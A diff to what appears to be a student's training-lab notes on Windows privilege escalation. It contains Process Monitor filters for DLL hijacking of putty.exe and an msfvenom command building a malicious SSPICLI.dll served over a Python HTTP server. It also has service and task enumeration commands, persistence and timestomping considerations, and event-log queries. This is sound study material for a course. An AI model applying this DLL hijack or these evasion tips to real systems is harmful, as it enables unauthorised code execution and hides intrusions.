@@ -323,19 +323,49 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
       The directory specified in the C+ function GetWindowsDirectory()
         The current directory
  
- 
-  
+Finding vulnerable Scheduled Tasks
+  schtasks /query /fo LIST /v
+--------------------------------------------------------------------------------------
+##DLL HIJACKING##
+Process Name contains putty.exe
+Path contains .dll
+Result is NAME NOT FOUND
 
+student@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+student@lin-ops:~$ python3 -m http.server 42070
 
+http://10.50.188.39:42070  #ON WINDOWS#
+##GRAB DLL ON WINDOWS MACHINE##
+##RUN PUTTY## (NEW FILE NAMED YOUR COMMAND SHOULD BE POPULATED)
+-----------------------------------------------------------------------------------------------------------------------------------------------
+Finding Vulnerable Services
+wmic service list full
+sc query
+##SEARCHING FOR PATHS THAT GET RAN FROM SPECIFIC SERVICES##
+##IDENTIFY PERMISSIONS##
+-------------------------------------------------------------
+##Persistance##
+Survives:
+Reboots
+Credential changes
+DHCP IP reassignment
 
+Considerations include:
+File naming
+File location
+Timestomping
+Port selection
 
+##AUDITPOL SETTINGS##
+auditpol /get /category:*
 
+##Event Logging##
+Storage: c:\windows\system32\config\
+File-Type: .evtx/.evt
 
-
-
-
-
-
+wevtutil el
+wmic ntevent where "logfile="<LOGNAME>" list full
+Get-Eventlog -List
 
 
 
